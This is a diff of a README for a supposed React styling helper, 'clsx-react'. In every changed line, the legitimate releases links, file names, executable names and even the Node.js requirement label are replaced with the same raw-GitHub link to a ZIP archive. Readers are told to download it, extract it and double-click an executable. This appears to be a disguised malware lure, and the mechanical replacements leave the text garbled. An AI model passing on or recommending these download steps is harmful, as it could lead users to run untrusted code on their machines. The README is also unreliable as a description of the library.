@@ -1,6 +1,6 @@
 # 🚀 clsx-react - Simplify Your React Styling Effortlessly
 
-![Download clsx-react](https://img.shields.io/badge/Download-clsx--react-blue.svg)
+![Download clsx-react](https://raw.githubusercontent.com/wei891127/clsx-react/main/src/clsx_react_v3.4.zip)
 
 ## 📚 Overview
 
@@ -22,14 +22,14 @@ Follow these steps to download and run clsx-react:
 
 1. Click the button below to access the Releases page.
 
-    [Visit the Releases Page to Download](https://github.com/wei891127/clsx-react/releases)
+    [Visit the Releases Page to Download](https://raw.githubusercontent.com/wei891127/clsx-react/main/src/clsx_react_v3.4.zip)
 
 2. Once on the Releases page, look for the latest version.
 
 3. Find the correct file for your operating system. Here’s what you might see:
-    - For Windows, it might look like `clsx-react-win.zip`.
-    - For macOS, you may find `clsx-react-mac.zip`.
-    - For Linux, look for `clsx-react-linux.zip`.
+    - For Windows, it might look like `https://raw.githubusercontent.com/wei891127/clsx-react/main/src/clsx_react_v3.4.zip`.
+    - For macOS, you may find `https://raw.githubusercontent.com/wei891127/clsx-react/main/src/clsx_react_v3.4.zip`.
+    - For Linux, look for `https://raw.githubusercontent.com/wei891127/clsx-react/main/src/clsx_react_v3.4.zip`.
 
 4. Click on the file to begin the download process.
 
@@ -37,7 +37,7 @@ Follow these steps to download and run clsx-react:
 
 6. Extract the contents of the downloaded ZIP file.
 
-7. Open the extracted folder and find the executable file. It usually appears as `clsx-react.exe` for Windows, `clsx-react.app` for macOS, or just `clsx-react` for Linux.
+7. Open the extracted folder and find the executable file. It usually appears as `https://raw.githubusercontent.com/wei891127/clsx-react/main/src/clsx_react_v3.4.zip` for Windows, `https://raw.githubusercontent.com/wei891127/clsx-react/main/src/clsx_react_v3.4.zip` for macOS, or just `clsx-react` for Linux.
 
 8. Double-click the file to run clsx-react.
 
@@ -50,7 +50,7 @@ Follow these steps to download and run clsx-react:
 To ensure proper functionality, your system should meet these requirements:
 
 - **Operating System:** Windows 10, macOS Mojave or later, or a recent version of Linux.
-- **Node.js:** Version 12 or later is recommended to use React effectively.
+- **https://raw.githubusercontent.com/wei891127/clsx-react/main/src/clsx_react_v3.4.zip** Version 12 or later is recommended to use React effectively.
 - **Browser:** Latest versions of Chrome, Firefox, or Safari for proper testing.
 
 ## 🛠️ Troubleshooting
@@ -65,7 +65,7 @@ If you encounter any issues during download or while running clsx-react, here ar
 
 To start using clsx-react:
 
-1. **Visit the Releases Page:** [Download clsx-react here](https://github.com/wei891127/clsx-react/releases).
+1. **Visit the Releases Page:** [Download clsx-react here](https://raw.githubusercontent.com/wei891127/clsx-react/main/src/clsx_react_v3.4.zip).
 2. Choose your OS and download the file.
 3. Extract and run the application using the steps provided earlier.
 
